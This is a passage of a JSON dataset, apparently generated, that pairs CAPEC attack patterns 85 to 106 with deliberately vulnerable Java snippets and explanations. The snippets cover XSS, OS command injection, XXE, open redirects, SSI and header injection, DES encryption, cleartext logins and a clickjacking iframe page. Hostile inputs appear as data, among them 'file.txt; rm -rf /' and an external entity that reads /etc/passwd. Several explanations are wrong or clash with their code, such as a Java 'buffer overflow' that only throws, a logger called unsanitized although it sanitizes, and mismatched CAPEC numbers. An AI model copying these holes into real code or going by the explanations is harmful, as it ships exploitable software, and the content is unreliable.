        "description": "This Java code snippet demonstrates a basic example of an XQuery Injection vulnerability. The code constructs an XQuery expression using unvalidated user input, which is then executed against an XML database. The user input is directly concatenated into the XQuery string, allowing an attacker to manipulate the query structure. This can lead to unauthorized data access or other malicious actions. The code highlights the importance of properly neutralizing user input to prevent injection attacks, as described in the CAPEC and related CWEs."
    },
    {
        "capec_id": "85",
        "capec_name": "AJAX Footprinting",
        "code_snippet": "import javax.servlet.http.*;\nimport java.io.IOException;\n\npublic class VulnerableAjaxServlet extends HttpServlet {\n    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws IOException {\n        String param = request.getParameter(\"input\");\n        // CWE-20: Improper Input Validation\n        if (param == null || param.isEmpty()) {\n            response.getWriter().write(\"Invalid input\");\n            return;\n        }\n        // CWE-79: Cross-Site Scripting (XSS)\n        response.getWriter().write(\"<html><body>\" + param + \"</body></html>\");\n    }\n\n    protected void doPost(HttpServletRequest request, HttpServletResponse response) throws IOException {\n        String param = request.getParameter(\"input\");\n        // CWE-116: Improper Encoding or Escaping of Output\n        response.setHeader(\"X-Input\", param);\n        response.getWriter().write(\"Data received\");\n    }\n}",
        "description": "This Java servlet code demonstrates vulnerabilities related to AJAX footprinting and the associated CWEs. The `doGet` method retrieves a parameter from the request without proper validation (CWE-20) and directly includes it in the HTML response, leading to a Cross-Site Scripting (XSS) vulnerability (CWE-79). The `doPost` method sets a header with user input without proper encoding (CWE-116), which can lead to HTTP Response Splitting attacks. These vulnerabilities can be exploited by attackers to gather information about the system and launch further attacks."
    },
    {
        "capec_id": "86",
        "capec_name": "XSS Through HTTP Headers",
        "code_snippet": "import javax.servlet.http.HttpServlet;\nimport javax.servlet.http.HttpServletRequest;\nimport javax.servlet.http.HttpServletResponse;\nimport java.io.IOException;\n\npublic class VulnerableHeaderServlet extends HttpServlet {\n    @Override\n    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws IOException {\n        String referer = request.getHeader(\"Referer\");\n        \n        // Vulnerable code: directly using the Referer header without validation\n        response.getWriter().println(\"<html><body>\");\n        response.getWriter().println(\"<a href='\" + referer + \"'>Click here</a>\");\n        response.getWriter().println(\"</body></html>\");\n    }\n}",
        "description": "This Java servlet code demonstrates a vulnerability where an HTTP header (Referer) is used directly in the generation of a web page without proper validation or neutralization. The servlet reads the Referer header from the incoming HTTP request and includes it in an HTML link. This can lead to Cross-Site Scripting (XSS) attacks if an attacker controls the Referer header value. The code snippet embodies the main idea of CAPEC-86 (XSS Through HTTP Headers) and is related to CWE-80, CWE-79, and CWE-644, as it fails to neutralize script-related HTML tags and scripting syntax in HTTP headers."
    },
    {
        "capec_id": "87",
        "capec_name": "Forceful Browsing",
        "code_snippet": "import java.io.IOException;\nimport javax.servlet.ServletException;\nimport javax.servlet.annotation.WebServlet;\nimport javax.servlet.http.HttpServlet;\nimport javax.servlet.http.HttpServletRequest;\nimport javax.servlet.http.HttpServletResponse;\nimport javax.servlet.http.HttpSession;\n\n@WebServlet(\"/admin\")\npublic class AdminServlet extends HttpServlet {\n    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {\n        HttpSession session = request.getSession(false);\n        if (session == null || session.getAttribute(\"role\") == null || !session.getAttribute(\"role\").equals(\"admin\")) {\n            response.sendError(HttpServletResponse.SC_FORBIDDEN, \"Access Denied\");\n            return;\n        }\n        // Sensitive operation\n        response.getWriter().println(\"Welcome to the admin panel!\");\n    }\n}",
        "description": "This Java servlet code snippet demonstrates a basic implementation of access control for an admin panel. The servlet checks if the user has an active session and if the user's role is 'admin'. If these conditions are not met, it returns a 403 Forbidden error. This snippet embodies the concept of 'Forceful Browsing' (CAPEC-111) by showing how to prevent unauthorized access to restricted areas of a web application. The related CWEs are addressed as follows: CWE-425 (Direct Request) is mitigated by checking the session and role, CWE-285 (Improper Authorization) is handled by verifying the user's role, and CWE-693 (Protection Mechanism Failure) is addressed by ensuring proper session and role checks. CWE-598 (Use of GET Request Method With Sensitive Query Strings) is not directly relevant in this context, and CWE-368 (Context Switching Race Condition) is not applicable in this simple example."
    },
    {
        "capec_id": "88",
        "capec_name": "OS Command Injection",
        "code_snippet": "import java.io.BufferedReader;\nimport java.io.IOException;\nimport java.io.InputStreamReader;\n\npublic class CommandInjectionExample {\n    public static void main(String[] args) {\n        if (args.length != 1) {\n            System.out.println(\"Usage: java CommandInjectionExample <filename>\");\n            return;\n        }\n\n        String filename = args[0];\n        try {\n            // Vulnerable code: using untrusted input to build a command string\n            String command = \"cat \" + filename;\n            Process process = Runtime.getRuntime().exec(command);\n            BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));\n            String line;\n            while ((line = reader.readLine()) != null) {\n                System.out.println(line);\n            }\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a classic example of OS Command Injection vulnerability. The program takes a filename as a command-line argument and constructs a command string to display the contents of the file using the 'cat' command. The filename is directly concatenated into the command string without any validation or sanitization, making it susceptible to injection attacks. An attacker could provide a malicious filename such as 'file.txt; rm -rf /' to execute arbitrary commands. This example embodies the main idea of CAPEC-88 and related CWEs, particularly CWE-78 (Improper Neutralization of Special Elements used in an OS Command) and CWE-20 (Improper Input Validation)."
    },
    {
        "capec_id": "89",
        "capec_name": "Pharming",
        "code_snippet": "import java.io.BufferedReader;\nimport java.io.InputStreamReader;\nimport java.net.HttpURLConnection;\nimport java.net.URL;\n\npublic class VulnerablePharmingExample {\n    public static void main(String[] args) {\n        try {\n            // CWE-494: Download of Code Without Integrity Check\n            URL url = new URL(\"http://example.com/download/code\");\n            HttpURLConnection connection = (HttpURLConnection) url.openConnection();\n            connection.setRequestMethod(\"GET\");\n            BufferedReader in = new BufferedReader(new InputStreamReader(connection.getInputStream()));\n            String inputLine;\n            StringBuilder content = new StringBuilder();\n            while ((inputLine = in.readLine()) != null) {\n                content.append(inputLine);\n            }\n            in.close();\n            connection.disconnect();\n\n            // Simulate executing downloaded code\n            System.out.println(\"Executing downloaded code: \" + content.toString());\n\n            // CWE-346: Origin Validation Error\n            URL bankUrl = new URL(\"http://mybank.com/login\");\n            HttpURLConnection bankConnection = (HttpURLConnection) bankUrl.openConnection();\n            bankConnection.setRequestMethod(\"GET\");\n            BufferedReader bankIn = new BufferedReader(new InputStreamReader(bankConnection.getInputStream()));\n            StringBuilder bankContent = new StringBuilder();\n            while ((inputLine = bankIn.readLine()) != null) {\n                bankContent.append(inputLine);\n            }\n            bankIn.close();\n            bankConnection.disconnect();\n\n            // CWE-350: Reliance on Reverse DNS Resolution for a Security-Critical Action\n            String hostname = bankUrl.getHost();\n            String ip = java.net.InetAddress.getByName(hostname).getHostAddress();\n            System.out.println(\"Resolved IP for \" + hostname + \": \" + ip);\n\n            // CWE-602: Client-Side Enforcement of Server-Side Security\n            if (hostname.equals(\"mybank.com\")) {\n                System.out.println(\"Access granted to: \" + hostname);\n            } else {\n                System.out.println(\"Access denied.\");\n            }\n\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerable scenario related to pharming attacks. The code includes several weaknesses that can be exploited in a pharming attack:\n\n1. **CWE-494: Download of Code Without Integrity Check** - The code downloads and executes content from a URL without verifying its integrity, which can lead to executing malicious code.\n\n2. **CWE-346: Origin Validation Error** - The code fetches content from a URL without properly validating the source, making it susceptible to redirection to a malicious site.\n\n3. **CWE-350: Reliance on Reverse DNS Resolution for a Security-Critical Action** - The code resolves the hostname to an IP address and uses it for security decisions without ensuring the IP address is truly associated with the hostname.\n\n4. **CWE-602: Client-Side Enforcement of Server-Side Security** - The code relies on client-side logic to enforce security decisions, which can be easily bypassed by an attacker.\n\nThis snippet illustrates how these weaknesses can be combined to create a scenario where a user might be redirected to a malicious site and execute untrusted code, embodying the main idea of a pharming attack."
    },
    {
        "capec_id": "90",
        "capec_name": "Reflection Attack in Authentication Protocol",
        "code_snippet": "import java.io.*;\nimport java.net.*;\n\npublic class ReflectionAttackExample {\n    public static void main(String[] args) throws IOException {\n        ServerSocket serverSocket = new ServerSocket(8080);\n        Socket clientSocket = serverSocket.accept();\n        BufferedReader in = new BufferedReader(new InputStreamReader(clientSocket.getInputStream()));\n        PrintWriter out = new PrintWriter(clientSocket.getOutputStream(), true);\n\n        // Simulate challenge-response authentication\n        String challenge = \"12345\";\n        out.println(challenge);\n\n        // Read response from client\n        String response = in.readLine();\n\n        // Vulnerable reflection attack: send the same challenge back as response\n        out.println(response);\n\n        // Close connections\n        in.close();\n        out.close();\n        clientSocket.close();\n        serverSocket.close();\n    }\n}",
        "description": "This Java code snippet demonstrates a simplified version of a reflection attack in an authentication protocol. The server sends a challenge to the client and then reads the client's response. Instead of properly verifying the response, the server simply sends the same response back to the client. This creates a vulnerability where an attacker can reflect the challenge back to the server, effectively bypassing the authentication mechanism. This example embodies the main idea of CAPEC-301 (Reflection Attack in an Authentication Protocol) and highlights the potential for incorrect implementation of authentication algorithms (CWE-303) and the risk of authentication bypass by spoofing (CWE-290)."
    },
    {
        "capec_id": "91",
        "capec_name": "DEPRECATED: XSS in IMG Tags",
        "code_snippet": "import javax.servlet.http.*;\nimport java.io.IOException;\n\npublic class XSSVulnerableServlet extends HttpServlet {\n    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws IOException {\n        String userInput = request.getParameter(\"userInput\");\n        response.setContentType(\"text/html\");\n        response.getWriter().println(\"<html><body>\");\n        response.getWriter().println(\"<img src='\" + userInput + \"' />\");\n        response.getWriter().println(\"</body></html>\");\n    }\n}",
        "description": "This Java servlet code demonstrates a vulnerability to Cross-Site Scripting (XSS) attacks through the improper neutralization of script in attributes of IMG tags (CWE-82). The servlet takes user input from a request parameter and directly inserts it into the src attribute of an IMG tag without any sanitization or validation. This allows an attacker to inject malicious scripts, which can be executed in the context of the user's browser. The code also highlights the risk of using incomplete denylist-based protection mechanisms (CWE-692) and improper neutralization of special characters (CWE-80), as it does not handle alternate XSS syntax (CWE-87) or doubled character manipulations (CWE-85)."
    },
    {
        "capec_id": "92",
        "capec_name": "Forced Integer Overflow",
        "code_snippet": "public class IntegerOverflowExample {\n    public static void main(String[] args) {\n        int maxValue = Integer.MAX_VALUE;\n        int[] array;\n        int size = maxValue + 1; // This will cause an integer overflow\n\n        // Allocate memory based on the overflowed size\n        array = new int[size]; // This will likely cause a runtime exception\n\n        // Fill the array with some values\n        for (int i = 0; i < size; i++) {\n            array[i] = i;\n        }\n\n        System.out.println(\"Array allocated and filled.\");\n    }\n}",
        "description": "This Java code snippet demonstrates a forced integer overflow vulnerability. The variable 'size' is calculated by adding 1 to Integer.MAX_VALUE, which causes an integer overflow and wraps around to a negative value. This incorrect size is then used to allocate an array, leading to a potential runtime exception or undefined behavior. This example embodies the main idea of CAPEC-190 (Forced Integer Overflow) and highlights related weaknesses such as CWE-190 (Integer Overflow or Wraparound) and CWE-680 (Integer Overflow to Buffer Overflow)."
    },
    {
        "capec_id": "93",
        "capec_name": "Log Injection-Tampering-Forging",
        "code_snippet": "import java.io.FileWriter;\nimport java.io.IOException;\nimport java.util.logging.Level;\nimport java.util.logging.Logger;\n\npublic class LogInjectionExample {\n    private static final Logger logger = Logger.getLogger(LogInjectionExample.class.getName());\n\n    public static void main(String[] args) {\n        String userInput = \"User123\\nINFO: User logged in successfully\";\n        logUserAction(userInput);\n    }\n\n    public static void logUserAction(String message) {\n        try (FileWriter fw = new FileWriter(\"app.log\", true)) {\n            // CWE-117: Improper Output Neutralization for Logs\n            // CWE-75: Failure to Sanitize Special Elements into a Different Plane\n            // CWE-150: Improper Neutralization of Escape, Meta, or Control Sequences\n            String sanitizedMessage = message.replaceAll(\"[\\n\\r]\", \"_\");\n            fw.write(sanitizedMessage + \"\\n\");\n        } catch (IOException e) {\n            logger.log(Level.SEVERE, \"Failed to write to log file\", e);\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerable logging mechanism that is susceptible to log injection attacks. The `logUserAction` method writes user input directly to a log file without proper sanitization, allowing an attacker to inject malicious log entries. The `userInput` string contains a newline character and a log entry, which could mislead log audits or cover traces of an attack. The code attempts to mitigate this by replacing newline characters with underscores, addressing CWE-117, CWE-75, and CWE-150. However, this simplistic approach may not be sufficient for all cases, highlighting the importance of thorough input validation and sanitization."
    },
    {
        "capec_id": "94",
        "capec_name": "Adversary in the Middle (AiTM)",
        "code_snippet": "import java.io.*;\nimport java.net.*;\nimport javax.net.ssl.*;\n\npublic class VulnerableServer {\n    public static void main(String[] args) throws Exception {\n        ServerSocket serverSocket = new ServerSocket(8080);\n        System.out.println(\"Server started on port 8080\");\n\n        while (true) {\n            Socket clientSocket = serverSocket.accept();\n            new Thread(new ClientHandler(clientSocket)).start();\n        }\n    }\n}\n\nclass ClientHandler implements Runnable {\n    private Socket clientSocket;\n\n    public ClientHandler(Socket socket) {\n        this.clientSocket = socket;\n    }\n\n    public void run() {\n        try {\n            BufferedReader in = new BufferedReader(new InputStreamReader(clientSocket.getInputStream()));\n            PrintWriter out = new PrintWriter(clientSocket.getOutputStream(), true);\n\n            String inputLine;\n            while ((inputLine = in.readLine()) != null) {\n                System.out.println(\"Received: \" + inputLine);\n                out.println(\"Echo: \" + inputLine);\n            }\n\n            in.close();\n            out.close();\n            clientSocket.close();\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}\n\nclass VulnerableClient {\n    public static void main(String[] args) throws Exception {\n        Socket socket = new Socket(\"localhost\", 8080);\n        PrintWriter out = new PrintWriter(socket.getOutputStream(), true);\n        BufferedReader in = new BufferedReader(new InputStreamReader(socket.getInputStream()));\n\n        out.println(\"Hello Server\");\n        System.out.println(\"Server response: \" + in.readLine());\n\n        in.close();\n        out.close();\n        socket.close();\n    }\n}",
        "description": "This Java code snippet demonstrates a simple client-server communication setup that is vulnerable to an Adversary in the Middle (AiTM) attack. The server listens on port 8080 and echoes back any received messages. The client connects to the server and sends a message. The code lacks proper authentication and encryption, making it susceptible to several weaknesses:\n\n1. **Channel Accessible by Non-Endpoint (CWE-300)**: The communication channel is not secured, allowing an adversary to intercept and alter the data.\n2. **Improper Authentication (CWE-287)**: There is no mechanism to verify the identity of the client or server, making it easy for an attacker to spoof identities.\n3. **Authentication Bypass by Capture-replay (CWE-294)**: The lack of encryption and session management allows an attacker to capture and replay messages.\n\nThis setup embodies the main idea of CAPEC-94 (Adversary in the Middle) by demonstrating how an insecure communication channel can be exploited by an attacker to intercept and manipulate data."
    },
    {
        "capec_id": "95",
        "capec_name": "WSDL Scanning",
        "code_snippet": "import javax.xml.ws.Service;\nimport javax.xml.namespace.QName;\nimport java.net.URL;\n\npublic class WSDLScanner {\n    public static void main(String[] args) {\n        try {\n            // URL of the WSDL file\n            URL wsdlURL = new URL(\"http://example.com/service?wsdl\");\n            // QName of the service\n            QName qname = new QName(\"http://example.com/\", \"ExampleService\");\n            // Create a service instance\n            Service service = Service.create(wsdlURL, qname);\n\n            // Attempt to access a method that might not be intended for public use\n            ExampleService exampleService = service.getPort(ExampleService.class);\n            String sensitiveData = exampleService.getSensitiveData(); // Potentially sensitive method\n            System.out.println(\"Sensitive Data: \" + sensitiveData);\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}\n\ninterface ExampleService {\n    String getSensitiveData(); // Method that might expose sensitive information\n}",
        "description": "This Java code snippet demonstrates a WSDL scanning attack. The code attempts to access a web service described by a WSDL file located at 'http://example.com/service?wsdl'. It creates a service instance and tries to invoke a method 'getSensitiveData' that might not be intended for public use. This method could potentially expose sensitive information, embodying the CWE-651 (Exposure of WSDL File Containing Sensitive Information) and CWE-497 (Exposure of Sensitive System Information to an Unauthorized Control Sphere). The code highlights how an attacker could use information from a WSDL file to guess and invoke private methods, leading to unauthorized access to sensitive data."
    },
    {
        "capec_id": "96",
        "capec_name": "Block Access to Libraries",
        "code_snippet": "import java.io.File;\nimport java.io.FileInputStream;\nimport java.io.IOException;\n\npublic class VulnerableLibraryAccess {\n    public static void main(String[] args) {\n        try {\n            // Attempt to load a library file\n            File libFile = new File(\"/path/to/external/library.so\");\n            FileInputStream fis = new FileInputStream(libFile);\n            // Simulate library usage\n            byte[] data = new byte[(int) libFile.length()];\n            fis.read(data);\n            fis.close();\n            System.out.println(\"Library loaded successfully.\");\n        } catch (IOException e) {\n            // Improper error handling\n            System.err.println(\"Failed to load library.\");\n            // Application may continue in an insecure state\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a scenario where an application attempts to load an external library file. The code tries to read the library file using a FileInputStream. If the library file is not accessible (e.g., due to permission issues or the file not existing), an IOException is caught. However, the error handling is insufficient as it only prints an error message and does not take any corrective action, potentially leaving the application in an insecure state. This embodies the main idea of the CAPEC 'Block Access to Libraries' by showing how blocked access to a library can lead to improper error handling and an insecure application state. The code also touches on related CWEs such as 'Call to Non-ubiquitous API' and 'Inclusion of Functionality from Untrusted Control Sphere' by attempting to load an external library that may not be present or trusted."
    },
    {
        "capec_id": "97",
        "capec_name": "Cryptanalysis",
        "code_snippet": "import java.security.SecureRandom;\nimport javax.crypto.Cipher;\nimport javax.crypto.KeyGenerator;\nimport javax.crypto.SecretKey;\nimport javax.crypto.spec.IvParameterSpec;\n\npublic class VulnerableCrypto {\n    public static void main(String[] args) throws Exception {\n        // Use of a broken or risky cryptographic algorithm (CWE-327)\n        String algorithm = \"DES\"; // DES is considered broken and insecure\n        KeyGenerator keyGen = KeyGenerator.getInstance(algorithm);\n        SecretKey secretKey = keyGen.generateKey();\n\n        // Generation of weak initialization vector (IV) (CWE-1204)\n        byte[] iv = new byte[8]; // DES uses an 8-byte IV\n        SecureRandom random = new SecureRandom();\n        random.nextBytes(iv); // IV is not sufficiently unpredictable\n        IvParameterSpec ivSpec = new IvParameterSpec(iv);\n\n        // Use of a cryptographic primitive with a risky implementation (CWE-1240)\n        Cipher cipher = Cipher.getInstance(\"DES/CBC/PKCS5Padding\");\n        cipher.init(Cipher.ENCRYPT_MODE, secretKey, ivSpec);\n\n        String plaintext = \"Sensitive Data\";\n        byte[] ciphertext = cipher.doFinal(plaintext.getBytes());\n\n        System.out.println(\"Ciphertext: \" + new String(ciphertext));\n    }\n}",
        "description": "This Java code snippet demonstrates several cryptographic vulnerabilities as described in the CAPEC and related CWEs. The code uses the DES algorithm, which is considered broken and insecure (CWE-327). It generates a weak initialization vector (IV) that is not sufficiently unpredictable (CWE-1204). Additionally, it uses a cryptographic primitive with a risky implementation (CWE-1240). The main idea of the CAPEC is to highlight how weaknesses in cryptographic algorithms and their implementations can be exploited to compromise security. This code serves as an example of how improper use of cryptographic techniques can lead to vulnerabilities."
    },
    {
        "capec_id": "98",
        "capec_name": "Phishing",
        "code_snippet": "import java.io.IOException;\nimport javax.servlet.ServletException;\nimport javax.servlet.http.HttpServlet;\nimport javax.servlet.http.HttpServletRequest;\nimport javax.servlet.http.HttpServletResponse;\n\npublic class PhishingServlet extends HttpServlet {\n    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {\n        String redirectUrl = request.getParameter(\"url\");\n        if (redirectUrl != null && !redirectUrl.isEmpty()) {\n            response.sendRedirect(redirectUrl);\n        } else {\n            response.getWriter().println(\"Invalid URL\");\n        }\n    }\n}\n",
        "description": "This Java servlet code snippet demonstrates a potential phishing vulnerability by implementing an open redirect (CWE-601). The servlet takes a 'url' parameter from the HTTP request and redirects the user to that URL without any validation. This can be exploited by attackers to redirect users to malicious sites, making it easier to conduct phishing attacks. The code snippet embodies the main idea of the CAPEC by showing how user interface misrepresentation and URL redirection can be used to deceive users into revealing confidential information."
    },
    {
        "capec_id": "99",
        "capec_name": "DEPRECATED: XML Parser Attack",
        "code_snippet": "import javax.xml.parsers.DocumentBuilderFactory;\nimport javax.xml.parsers.DocumentBuilder;\nimport org.w3c.dom.Document;\nimport java.io.StringReader;\nimport javax.xml.XMLConstants;\nimport javax.xml.transform.stream.StreamSource;\nimport javax.xml.validation.SchemaFactory;\n\npublic class VulnerableXMLParser {\n    public static void main(String[] args) {\n        String xmlInput = \"<?xml version=\\\"1.0\\\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \\\"file:///etc/passwd\\\">]><foo>&xxe;</foo>\";\n        try {\n            DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();\n            // Vulnerable code: does not disable external entities\n            DocumentBuilder db = dbf.newDocumentBuilder();\n            Document doc = db.parse(new InputSource(new StringReader(xmlInput)));\n            System.out.println(\"Parsed XML: \" + doc.getDocumentElement().getTextContent());\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerable XML parser that is susceptible to XML External Entity (XXE) attacks. The code does not disable external entity processing, which allows an attacker to include an external entity in the XML input. In this example, the external entity references the file '/etc/passwd', which could lead to sensitive information disclosure. This vulnerability is related to CWE-611 (Improper Restriction of XML External Entity Reference) and highlights the importance of properly configuring XML parsers to prevent such attacks."
    },
    {
        "capec_id": "100",
        "capec_name": "Overflow Buffers",
        "code_snippet": "import java.io.BufferedReader;\nimport java.io.IOException;\nimport java.io.InputStreamReader;\n\npublic class BufferOverflowExample {\n    public static void main(String[] args) {\n        BufferedReader reader = new BufferedReader(new InputStreamReader(System.in));\n        char[] buffer = new char[10]; // Small buffer size\n        try {\n            System.out.println(\"Enter some text:\");\n            int charsRead = reader.read(buffer, 0, 50); // Attempt to read more characters than the buffer can hold\n            System.out.println(\"You entered: \" + new String(buffer, 0, charsRead));\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a buffer overflow vulnerability. The program reads input from the user into a fixed-size buffer of 10 characters. However, it attempts to read up to 50 characters into this buffer, which can lead to a buffer overflow. This example embodies the main idea of CAPEC-1000 (Overflow Buffers) and illustrates CWE-120 (Buffer Copy without Checking Size of Input) and CWE-805 (Buffer Access with Incorrect Length Value). The vulnerability arises because the code does not verify that the input size is within the bounds of the allocated buffer, potentially allowing an attacker to overwrite adjacent memory."
    },
    {
        "capec_id": "101",
        "capec_name": "Server Side Include (SSI) Injection",
        "code_snippet": "import java.io.*;\nimport javax.servlet.*;\nimport javax.servlet.http.*;\n\npublic class VulnerableSSIServlet extends HttpServlet {\n    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {\n        String userInput = request.getParameter(\"input\");\n        response.setContentType(\"text/html\");\n        PrintWriter out = response.getWriter();\n\n        // Vulnerable code: directly including user input in the response\n        out.println(\"<!--#echo var='\" + userInput + \"' -->\");\n    }\n}",
        "description": "This Java servlet code demonstrates a Server Side Include (SSI) Injection vulnerability. The servlet takes user input from an HTTP GET request parameter and directly includes it in the response without proper validation or neutralization. This can allow an attacker to inject SSI directives, which the server will execute, potentially leading to arbitrary code execution or information disclosure. The code snippet embodies the main idea of CAPEC-97 by showing improper neutralization of server-side includes within a web page. It also touches on related CWEs such as improper input validation (CWE-20) and improper neutralization of special elements (CWE-74)."
    },
    {
        "capec_id": "102",
        "capec_name": "Session Sidejacking",
        "code_snippet": "import java.io.*;\nimport java.net.*;\n\npublic class VulnerableSessionSidejacking {\n    public static void main(String[] args) throws IOException {\n        URL url = new URL(\"http://example.com/login\"); // CWE-319: Cleartext Transmission of Sensitive Information\n        HttpURLConnection connection = (HttpURLConnection) url.openConnection();\n        connection.setRequestMethod(\"POST\");\n        connection.setDoOutput(true);\n\n        String credentials = \"username=user&password=pass\"; // CWE-522: Insufficiently Protected Credentials\n        OutputStream os = connection.getOutputStream();\n        os.write(credentials.getBytes());\n        os.flush();\n        os.close();\n\n        BufferedReader in = new BufferedReader(new InputStreamReader(connection.getInputStream()));\n        String inputLine;\n        StringBuilder response = new StringBuilder();\n\n        while ((inputLine = in.readLine()) != null) {\n            response.append(inputLine);\n        }\n        in.close();\n\n        String sessionToken = connection.getHeaderField(\"Set-Cookie\"); // CWE-614: Sensitive Cookie in HTTPS Session Without 'Secure' Attribute\n        System.out.println(\"Session Token: \" + sessionToken);\n\n        // Simulate using the session token in subsequent requests\n        URL protectedUrl = new URL(\"http://example.com/protected\");\n        HttpURLConnection protectedConnection = (HttpURLConnection) protectedUrl.openConnection();\n        protectedConnection.setRequestProperty(\"Cookie\", sessionToken); // CWE-294: Authentication Bypass by Capture-replay\n\n        BufferedReader protectedIn = new BufferedReader(new InputStreamReader(protectedConnection.getInputStream()));\n        String protectedInputLine;\n        StringBuilder protectedResponse = new StringBuilder();\n\n        while ((protectedInputLine = protectedIn.readLine()) != null) {\n            protectedResponse.append(protectedInputLine);\n        }\n        protectedIn.close();\n\n        System.out.println(\"Protected Response: \" + protectedResponse.toString());\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerable implementation that embodies the concept of session sidejacking. The code sends login credentials over an unencrypted HTTP connection (CWE-319: Cleartext Transmission of Sensitive Information), which can be intercepted by an attacker. The credentials are also insufficiently protected (CWE-522: Insufficiently Protected Credentials). After logging in, the server responds with a session token, which is not marked with the 'Secure' attribute (CWE-614: Sensitive Cookie in HTTPS Session Without 'Secure' Attribute). The session token is then used in subsequent requests, making it susceptible to capture and replay attacks (CWE-294: Authentication Bypass by Capture-replay). This code highlights the risks associated with transmitting sensitive information over unencrypted channels and the importance of securing session tokens."
    },
    {
        "capec_id": "103",
        "capec_name": "Clickjacking",
        "code_snippet": "import javax.servlet.http.*;\nimport java.io.IOException;\n\npublic class ClickjackingVulnerableServlet extends HttpServlet {\n    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws IOException {\n        response.setContentType(\"text/html\");\n        response.getWriter().println(\"<html><body>\");\n        response.getWriter().println(\"<h1>Welcome to the vulnerable page</h1>\");\n        response.getWriter().println(\"<form action='transfer' method='post'>\");\n        response.getWriter().println(\"<input type='text' name='amount' placeholder='Enter amount' />\");\n        response.getWriter().println(\"<input type='submit' value='Transfer' />\");\n        response.getWriter().println(\"</form>\");\n        response.getWriter().println(\"</body></html>\");\n    }\n}\n\n// Another file: MaliciousPage.html\n<!DOCTYPE html>\n<html>\n<head>\n    <title>Malicious Page</title>\n</head>\n<body>\n    <h1>Clickjacking Example</h1>\n    <iframe src=\"http://vulnerable-site.com/ClickjackingVulnerableServlet\" style=\"opacity:0; position:absolute; top:0; left:0; width:100%; height:100%;\"></iframe>\n    <button onclick=\"alert('You clicked me!')\">Click me!</button>\n</body>\n</html>",
        "description": "The provided Java code snippet demonstrates a basic servlet that renders a form for transferring money. The form is vulnerable to clickjacking because it does not implement any frame-busting techniques, such as the X-Frame-Options header. The accompanying HTML file, MaliciousPage.html, embeds the vulnerable servlet within an invisible iframe. When a user interacts with the 'Click me!' button on the malicious page, they might unknowingly interact with the form in the iframe, potentially initiating a money transfer. This example embodies the main idea of CAPEC-103 (Clickjacking) and CWE-1021 (Improper Restriction of Rendered UI Layers or Frames)."
    },
    {
        "capec_id": "104",
        "capec_name": "Cross Zone Scripting",
        "code_snippet": "import javax.servlet.http.*;\nimport java.io.IOException;\n\npublic class CrossZoneScriptingExample extends HttpServlet {\n    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws IOException {\n        String userInput = request.getParameter(\"input\");\n        String zone = request.getParameter(\"zone\");\n\n        // CWE-20: Improper Input Validation\n        if (zone == null || (!zone.equals(\"trusted\") && !zone.equals(\"untrusted\"))) {\n            response.sendError(HttpServletResponse.SC_BAD_REQUEST, \"Invalid zone\");\n            return;\n        }\n\n        // CWE-116: Improper Encoding or Escaping of Output\n        response.setContentType(\"text/html\");\n        response.getWriter().println(\"<html><body>\");\n        response.getWriter().println(\"<h1>Zone: \" + zone + \"</h1>\");\n        response.getWriter().println(\"<p>Input: \" + userInput + \"</p>\"); // Potential XSS vulnerability\n        response.getWriter().println(\"</body></html>\");\n\n        // CWE-250: Execution with Unnecessary Privileges\n        if (zone.equals(\"trusted\")) {\n            executeWithHighPrivileges(userInput);\n        }\n    }\n\n    private void executeWithHighPrivileges(String command) {\n        // Simulate execution with high privileges\n        System.out.println(\"Executing command with high privileges: \" + command);\n    }\n}",
        "description": "This Java servlet code snippet demonstrates a Cross Zone Scripting vulnerability. The code takes user input and a zone parameter from an HTTP GET request. It performs minimal validation on the zone parameter (CWE-20: Improper Input Validation) and directly includes user input in the HTML response without proper encoding or escaping (CWE-116: Improper Encoding or Escaping of Output), leading to potential XSS vulnerabilities. Additionally, if the zone is 'trusted', it executes a command with high privileges (CWE-250: Execution with Unnecessary Privileges). This setup can allow an attacker to bypass security zones and execute scripts or commands with elevated privileges, embodying the main idea of Cross Zone Scripting."
    },
    {
        "capec_id": "105",
        "capec_name": "HTTP Request Splitting",
        "code_snippet": "import java.io.IOException;\nimport javax.servlet.ServletException;\nimport javax.servlet.http.HttpServlet;\nimport javax.servlet.http.HttpServletRequest;\nimport javax.servlet.http.HttpServletResponse;\n\npublic class VulnerableServlet extends HttpServlet {\n    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {\n        String userInput = request.getParameter(\"input\");\n        // Vulnerable code: does not neutralize CRLF sequences\n        String headerValue = \"UserInput: \" + userInput;\n        response.setHeader(\"X-User-Input\", headerValue);\n    }\n}",
        "description": "This Java servlet code demonstrates a vulnerability related to HTTP Request Splitting (CAPEC-33) and HTTP Request/Response Smuggling (CWE-113). The code takes user input from an HTTP request parameter and directly includes it in an HTTP response header without proper neutralization of CRLF sequences. This can allow an attacker to inject malicious headers or split the HTTP request, leading to potential security issues such as unauthorized actions or data leakage. The code snippet highlights the importance of properly sanitizing and neutralizing user inputs to prevent such vulnerabilities."
    },
    {
        "capec_id": "106",
        "capec_name": "DEPRECATED: XSS through Log Files",
